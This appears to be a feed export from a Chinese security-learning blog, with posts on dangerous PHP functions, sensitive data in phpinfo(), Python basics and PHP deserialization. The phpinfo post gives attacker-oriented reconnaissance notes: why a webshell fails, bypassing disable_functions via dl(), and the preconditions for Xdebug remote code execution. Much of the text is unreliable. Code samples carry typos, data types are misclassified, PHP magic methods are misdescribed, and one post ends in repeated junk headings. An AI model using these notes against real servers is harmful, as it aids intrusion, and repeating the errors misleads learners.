class="variable">$replace</span> = <span class="keyword">array</span> (<span class="string">&#x27;\3/\4/\1\2&#x27;</span>, <span class="string">&#x27;$\1 =&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="variable">$patterns</span>, <span class="variable">$replace</span>, <span class="string">&#x27;&#123;startDate&#125; = 1999-5-27&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$startDate</span> = <span class="number">5</span>/<span class="number">27</span>/<span class="number">1999</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="comment">#剥离空白字符</span></span><br><span class="line"></span><br><span class="line">这个例子剥离多余的空白字符</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;foo   o&#x27;</span>;</span><br><span class="line"><span class="variable">$str</span> = preg_replace(<span class="string">&#x27;/\s\s+/&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="comment">// 将会改变为&#x27;foo o&#x27;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment">#使用参数count</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$count</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> preg_replace(<span class="keyword">array</span>(<span class="string">&#x27;/\d/&#x27;</span>, <span class="string">&#x27;/\s/&#x27;</span>), <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;xp 4 to&#x27;</span>, -<span class="number">1</span> , <span class="variable">$count</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$count</span>; <span class="comment">//3</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#以上例程会输出：</span></span><br><span class="line"></span><br><span class="line">xp***to</span><br><span class="line"><span class="number">3</span></span><br><span class="line"></span><br><span class="line">**  **</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;php常见危险函数&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;phpinfo()&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;输出 PHP 当前状态的大量信息，包含了 PHP 编译选项、启用的扩展、PHP 版本、服务器信息和环境变量（如果编译为一个模块的话）、PHP环境变</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="php" scheme="https://sinevil.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>phpinfo()中的敏感信息</title>
    <link href="https://sinevil.github.io/2021/08/08/phpinfo/"/>
    <id>https://sinevil.github.io/2021/08/08/phpinfo/</id>
    <published>2021-08-08T10:54:55.000Z</published>
    <updated>2021-08-12T03:39:52.095Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#phpinfo()中的敏感信息</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#绝对路径</span></span><br><span class="line">(_SERVER[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">#支持程序</span></span><br><span class="line">判断服务器是否加载了redis、memcache、mongodb、mysql、curl，如果加载了，那么就可以适当往这几个方面考虑，还可以看看是否支持gopher、是否启了fastcgi</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露真实ip</span></span><br><span class="line">(_SERVER[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>])  SERVER_ADDR</span><br><span class="line"></span><br><span class="line"><span class="comment">#配置文件位置</span></span><br><span class="line">Loaded Configuration File</span><br><span class="line"></span><br><span class="line"><span class="comment">#敏感配置</span></span><br><span class="line">allow_url_include、allow_url_fopen、disable_functions、open_basedir、short_open_tag</span><br><span class="line"></span><br><span class="line"><span class="comment">#session</span></span><br><span class="line">session.save_path=”” –设置session的存储路径</span><br><span class="line">session.save_handler=”” –设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)</span><br><span class="line">session.auto_start boolen –指定会话模块是否在请求开始时启动一个会话,默认为0不启动</span><br><span class="line">session.serialize_handler string –定义用来序列化/反序列化的处理器名字。默认使用php</span><br><span class="line"></span><br><span class="line"><span class="comment">#server api</span></span><br><span class="line">php解释器与应用层的桥梁。</span><br><span class="line">FPM/FastCGI 多用于和nginx通信，当然也可用于其他web中间件。</span><br><span class="line">Apache 2.0 Handler php为apache提供的专用SAPI</span><br><span class="line">Command Line Interface php命令行</span><br><span class="line"></span><br><span class="line"><span class="comment">#disable_functions</span></span><br><span class="line">有时候我们上传了一个webshell却不能用，有很大可能是管理员做了配置，禁用了php执行系统命令的函数</span><br><span class="line"></span><br><span class="line"><span class="comment">#open_basedir</span></span><br><span class="line">这个选项设置了文件读取的时候的目录限制</span><br><span class="line"></span><br><span class="line"><span class="comment">#enable_dll</span></span><br><span class="line">利用扩展库绕过disable_functions，需要使用dl()并且开启这个选项</span><br><span class="line"></span><br><span class="line"><span class="comment">#xdebug 远程rce</span></span><br><span class="line">漏洞利用条件：</span><br><span class="line">xdebug.remote_connect_back 的回连是通过自定义 Header（xdebug.remote_addr_header）、X-Forwarded-For 和 Remote-Addr 三个确定的，依次 fallback，所以即使配置了自定义 Header，也可以通过设置 XFF 头来指定服务器连接，就是让被调试的服务器去连接我们的恶意主机，此时我们的恶意主机就可以和目标服务器进行交互，并且因为是xdebug是支持dbgp的，所以可以此时让恶意主机发送恶意指令到目标服务器让其执行</span><br><span class="line"> 需要在目标站的phpinfo中看到：</span><br><span class="line">xdebug.remote_connect_back =&gt; On =&gt; On</span><br><span class="line">xdebug.remote_cookie_expire_time =&gt; 3600 =&gt; 3600</span><br><span class="line">xdebug.remote_enable =&gt; On =&gt; On</span><br><span class="line">即可使用Xdebug进行连接，尝试直接命令执行</span><br><span class="line"></span><br><span class="line"><span class="comment">#opcache</span></span><br><span class="line">opcache是缓存文件，他的作用就类似于web项目中的静态文件的缓存, 比如我们加载一个网页, 浏览器会自动帮我们把jpg, css缓存起来, 唯独php没有缓存, 每次均需要open文件, 解析代码, 执行代码这一过程, 而opcache即可解决这个问题, 代码会被高速缓存起来, 提升访问速度。</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="php" scheme="https://sinevil.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>python</title>
    <link href="https://sinevil.github.io/2021/08/01/python/"/>
    <id>https://sinevil.github.io/2021/08/01/python/</id>
    <published>2021-08-01T10:42:55.000Z</published>
    <updated>2021-08-13T02:49:36.877Z</updated>
    
    <content type="html"><![CDATA[<h2> Python入门到入门 </h2><h4>目录</h4><p><a href="#1">什么是python</a></p><p><a href="#2">编码</a></p><p><a href="#3">注释</a></p><p><a href="#4">标识符</a></p><p><a href="#5">行事项</a></p><p><a href="#6">import和from…import</a></p><p><a href="#7">简易输入输出</a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><p><a href="#1"></a></p><h4 id="1">1. Python理解 </h4><ul><li>Python起源</li></ul><p>Python由荷兰数和计算机科学研究学会的Guido van Rossum于1990 年代初设计，作为一门叫做ABC语言的替代品。 Python提供了高效的高级数据结构，还能简单有效地面向对象编程。Python语法和动态类型，以及解释型语言的本质，使它成为多数平台上写脚本和快速开发应用的编程语言；随着版本的不断更新和语言新功能的添加，逐渐被用于独立的、大型项目的开发。</p><ul><li>语言特点</li></ul><p>简单 易读 易维护 用途广泛 速度快 免费 开源 高层次性 可移植性 解释性 面向对象 可扩展性 可扩充性 可嵌入性 丰富的库 规范的代码 高级动态编程 <a href="https://baike.baidu.com/item/Python/407313?fr=aladdin">详情</a></p><h4 id="2">2. 编码 </h4><ul><li>默认情况下python3以<code>TF-8</code>编码，所有字符串都是unicode字符串，当然也可为源码文件指定不同的编码</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding :cp-152 -*-</span></span><br></pre></td></tr></table></figure><h4 id="3">3. 注释 </h4><ul><li>python 单行注释</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">格式：<span class="comment">#注释内容</span></span><br></pre></td></tr></table></figure><p>Python解释器遇到<code>#</code>后，会自动忽略它后面整行的内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用python输出字符串/数字(说明多行代码功能时)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;hello world&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;I lOVE YOU&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="number">520</span>)</span><br><span class="line"><span class="built_in">print</span>((<span class="number">3</span>+<span class="number">3</span>)*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#说明单行代码一般放在代码右侧</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;you are my eyes&quot;</span>) <span class="comment">#输出一串土味情话</span></span><br><span class="line"><span class="built_in">print</span>(<span class="number">50</span>*<span class="number">8</span>+<span class="number">20</span>) <span class="comment">#用数字表达你的爱意</span></span><br></pre></td></tr></table></figure><ul><li>多行注释</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">格式(一)</span></span><br><span class="line"><span class="string">连续的三个单引号作为开头和结尾</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">格式(二)</span></span><br><span class="line"><span class="string">连续的三个双引号作为开头和结尾</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">* 注意事项</span><br><span class="line"></span><br><span class="line">​```python</span><br><span class="line"><span class="comment">#python多行注释不支持嵌套，以下为错误示例</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">外层注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">内层注释</span><br><span class="line">    <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">   </span><br><span class="line"><span class="comment">#当注释符以字符串形式出现时，被视为正常代码的一部分</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注释可以帮助调试程序</span></span><br></pre></td></tr></table></figure><h4 id="4">4. 标识符</h4><p>标识符是编程时使用的名字，用于给变量、函数、语句块等命名，Python 中标识符由字母、数字、下划线组成，不能以数字开头，区分大小写</p><p>以下划线开头的标识符有特殊含义</p><p>单下划线开头的标识符，如：<code>_xxx</code>，表示不能直接访问的类属性，需通过类提供的接口进行访问，不能用<code>from xxx import *</code>导入</p><p>双下划线开头的标识符，如：<code>__xx</code>，表示私有成员</p><p>双下划线开头和结尾的标识符，如：<code>__xx__</code>，表示 Python 中内置标识，如：<code>__init__()</code> 表示类的构造函数</p><h4 id="5"> 5.行事项  </h4><ul><li>行与缩进</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python使用缩进来表示代码块,当缩进格数不一致时，会导致错误</span></span><br><span class="line"><span class="keyword">if</span> Ture:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;True&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;flase&quot;</span>)</span><br><span class="line">   <span class="built_in">print</span> (<span class="string">&quot;报错&quot;</span>) </span><br></pre></td></tr></table></figure><ul><li>多行语句</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python通常为一行写完一条语句，但是如果语句很长，我们可以使用 \ 来实现多行语句</span></span><br><span class="line">total = item_one + \</span><br><span class="line">item_two + \</span><br><span class="line">item_three</span><br><span class="line"></span><br><span class="line"><span class="comment">#在[]&#123;&#125;()中的多行语句，不需要使用 \</span></span><br><span class="line">total = [<span class="string">&#x27;itrm_one&#x27;</span>,<span class="string">&#x27;item_two&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* 同一行多条语句</span><br><span class="line"></span><br><span class="line">Python可以在同一行使用多条语句，语句之间用 ; 分隔</span><br><span class="line"></span><br><span class="line">​```python</span><br><span class="line"><span class="comment">#实例</span></span><br><span class="line"><span class="keyword">import</span> sys; x = <span class="string">&#x27;runoob&#x27;</span>; sys.stdout.write(x + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#运行结果(脚本)</span></span><br><span class="line">runoob</span><br><span class="line"><span class="comment">#运行结果(交互式命令)</span></span><br><span class="line">runoob</span><br><span class="line"><span class="number">7</span>(字符数)</span><br></pre></td></tr></table></figure><ul><li>空行</li></ul><p>函数之间或类的方法之间用空行分隔，表示一段新的代码的开始。类和函数入口之间也用一行空行分隔，以突出函数入口的开始。</p><p>空行与代码缩进不同，空行并不是Python语法的一部分。书写时不插入空行，Python解释器运行也不会出错。但是空行的作用在于分隔两段不同功能或含义的代码，便于日后代码的维护或重构。</p><blockquote><p>空行也是程序代码的一部分</p></blockquote><h4 id="6">6. import和from...import </h4><p>在 python 用 <code>import</code>或者 <code>from...import</code> 来导入相应的模块。</p><p>将整个模块(somemodule)导入，格式为： <code>import somemodule</code></p><p>从某个模块中导入某个函数,格式为： <code>from somemodule import somefunction</code></p><p>从某个模块中导入多个函数,格式为： <code>from somemodule import firstfunc, secondfunc, thirdfunc</code></p><p>将某个模块中的全部函数导入，格式为： <code>from somemodule import </code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#导入sys模块</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;=============Python import mode===========&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;命令行参数：&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> sys.argv:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;\n python 路径为&#x27;</span>,sys.path)</span><br><span class="line"></span><br><span class="line"><span class="comment">#导入sys模块的argv,path成员</span></span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> agrv,path</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;============Python from import============&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&#x27;path&#x27;</span>,path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;h4 <span class="built_in">id</span>=<span class="string">&quot;7&quot;</span>&gt; <span class="number">7.</span> 简易输入输出 &lt;/h4&gt;</span><br><span class="line"></span><br><span class="line">* 等待用户输入</span><br><span class="line"></span><br><span class="line">​```python</span><br><span class="line"><span class="built_in">input</span>(<span class="string">&quot;\n\n按下回车后退出&quot;</span>)</span><br></pre></td></tr></table></figure><ul><li>print输出</li></ul><p>print默认输出式换行的，如果要实现不换行需要在变量末尾加上<code>end=&quot;&quot;</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="string">&quot;a&quot;</span></span><br><span class="line">y = <span class="string">&quot;b&quot;</span></span><br><span class="line"><span class="comment">#换行输出</span></span><br><span class="line"><span class="built_in">print</span> (x)</span><br><span class="line"><span class="built_in">print</span> (y)  </span><br><span class="line"><span class="comment">#不换行输出</span></span><br><span class="line"><span class="built_in">print</span> (x, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="built_in">print</span> (x, end=<span class="string">&quot; &quot;</span>)</span><br><span class="line"><span class="comment">#输出结果</span></span><br><span class="line">a</span><br><span class="line">b</span><br><span class="line">a b</span><br></pre></td></tr></table></figure><h4 id="8"> 8. 变量类型 </h4><ul><li>变量的赋值</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Python使用=作为赋值运算符</span></span><br><span class="line">name = value</span><br><span class="line">name表示变量名，value表示值，也就是要保存的数据</span><br><span class="line"></span><br><span class="line"><span class="comment">#变量不是一成不变的，它可以随时被覆盖，只要将前边的重新赋值即可，变量只能容纳一个值</span></span><br><span class="line">n = <span class="number">1</span></span><br><span class="line">n = <span class="number">10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#变量可以赋值单个数据，也可以将表达式的运行结果赋值给变量</span></span><br></pre></td></tr></table></figure><ul><li>Python是弱类型语言</li></ul><p>在强类型编程语言中，定义变量时要指明变量的类型，而且赋值的数据也必须是相同的，C++，C，java都是强类型编程语言</p><p>在弱类型语言中，变量无需声明就可直接赋值，变量的数据类型可以随时改变，Python，javascript，php等脚本语言一般都是弱类型的</p><ul><li>多变量赋值</li></ul><p>python允许你同时为多个变量赋值</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#创建一个整型对象，值为1，从后往前赋值，三个变量被赋予相同的数值</span></span><br><span class="line">a = b = c = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#同时为多个对象指定多个变量,各自分配</span></span><br><span class="line">a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="string">&quot;runoob&quot;</span></span><br></pre></td></tr></table></figure><ul><li>标准数据类型</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Number<span class="comment">#数字</span></span><br><span class="line">String<span class="comment">#字符串</span></span><br><span class="line"><span class="type">List</span><span class="comment">#列表，且以上为不可变数据</span></span><br><span class="line"><span class="type">Tuple</span><span class="comment">#元组</span></span><br><span class="line"><span class="type">Set</span><span class="comment">#集合</span></span><br><span class="line">Dictionary<span class="comment">#字典，且以上为可变数据</span></span><br></pre></td></tr></table></figure><ul><li>数字类型</li></ul><p>python中数字总共有四种类型</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int<span class="comment">#整数型，只有一种整数型int，表示为长整型，无pyton2中的Long</span></span><br><span class="line">bool<span class="comment">#布尔型，如true flase</span></span><br><span class="line"><span class="built_in">float</span><span class="comment">#浮点型，如1.23、3e-2</span></span><br><span class="line">complex<span class="comment">#复数，如1+2j</span></span><br></pre></td></tr></table></figure><p>如同大多数语言一样，数值型的赋值和计算都是很直观的，python内置的<code>type()</code>函数可以用来查询变量所指的对象类型。此外也可以用<code>isinstance</code>来判断</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#type()函数判断</span></span><br><span class="line">a, b, c, d = <span class="number">20</span>, <span class="number">5.5</span>, Ture, <span class="number">4</span>+<span class="number">3j</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a), <span class="built_in">type</span>(b), <span class="built_in">type</span>(c), <span class="built_in">type</span>(d))</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">int</span>&#x27;&gt; &lt;<span class="title">class</span> &#x27;<span class="title">float</span>&#x27;&gt; &lt;<span class="title">class</span> &#x27;<span class="title">bool</span>&#x27;&gt; &lt;<span class="title">class</span> &#x27;<span class="title">complex</span>&#x27;&gt;#结果</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#<span class="title">isinstance</span>判断</span></span><br><span class="line"><span class="class"><span class="title">a</span> = 111</span></span><br><span class="line"><span class="class"><span class="title">isinstance</span>(<span class="params">a, <span class="built_in">int</span></span>)</span></span><br><span class="line"><span class="class"><span class="title">Ture</span>#结果</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">#<span class="title">type</span>()不会认为子类是父类的一种类型，不考虑继承关系</span></span><br><span class="line"><span class="class">#<span class="title">isinstance</span>()会认为子类是一种父类类型，考虑继承关系</span></span><br></pre></td></tr></table></figure><p>在python3中，bool是int的字类，True和False可以和数字相加 <code>True==1</code>,<code>False==0</code>是会返回Ture，但是可以通过<code>is</code>来判断类型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">issubclass</span>(<span class="built_in">bool</span>, <span class="built_in">int</span>)</span><br><span class="line"><span class="literal">True</span> = <span class="number">1</span></span><br><span class="line">Flase + <span class="number">1</span> = <span class="number">1</span><span class="comment">#以上为True</span></span><br><span class="line"><span class="number">1</span> <span class="keyword">is</span> <span class="literal">True</span><span class="comment">#Flase</span></span><br></pre></td></tr></table></figure><p>当你指定一个值时，Number对象就会被创建</p><p>同时也可以使用del语句删除一些对象的引用</p><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2><h2 id="4">Pass-04 </h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2&gt; Python入门到入门 &lt;/h2&gt;

&lt;h4&gt;目录&lt;/h4&gt;

&lt;p&gt;&lt;a href=&quot;#1&quot;&gt;什么是python&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#2&quot;&gt;编码&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#3&quot;&gt;注释&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;#4&quot;</summary>
      
    
    
    
    <category term="基础语言" scheme="https://sinevil.github.io/categories/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Python" scheme="https://sinevil.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>PHP反序列化漏洞(停制)</title>
    <link href="https://sinevil.github.io/2021/07/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://sinevil.github.io/2021/07/27/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2021-07-27T01:21:18.000Z</published>
    <updated>2021-08-03T07:34:52.641Z</updated>
    
    <content type="html"><![CDATA[<p><strong>PHP的类和对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">classs person&#123;</span><br><span class="line"><span class="comment">//定义类属性(类似变量),public 代表可见性(共有)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;joke&#x27;</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">smile</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;name.<span class="string">&quot; is smile...\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$psycho</span> = <span class="keyword">new</span> person();<span class="comment">//根据person类实例化对象</span></span><br><span class="line"><span class="variable">$psycho</span>-&gt;smile();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">#定义了一个person类，在类中定义了一个public类型的变量$name和类的方法smile，然后实例化一个对象$psycho，去调用person类里面的smile方法</span></span><br></pre></td></tr></table></figure><p>​    <strong>魔术方法</strong></p><table><thead><tr><th align="center">方法名</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">__construct</td><td align="center">构造函数，在创建对象时候初始化对象，一般用于对变量赋初值</td></tr><tr><td align="center">__destruct</td><td align="center">析构函数，和构造函数相反，在对象不再被使用时(将所有该对象的引用设为null)或者程序退出时自动调用</td></tr><tr><td align="center">__toString</td><td align="center">使用unserialize时触发，反序列化恢复对象之前调用该方法</td></tr><tr><td align="center">__wakeup()</td><td align="center">使用serialize时触发 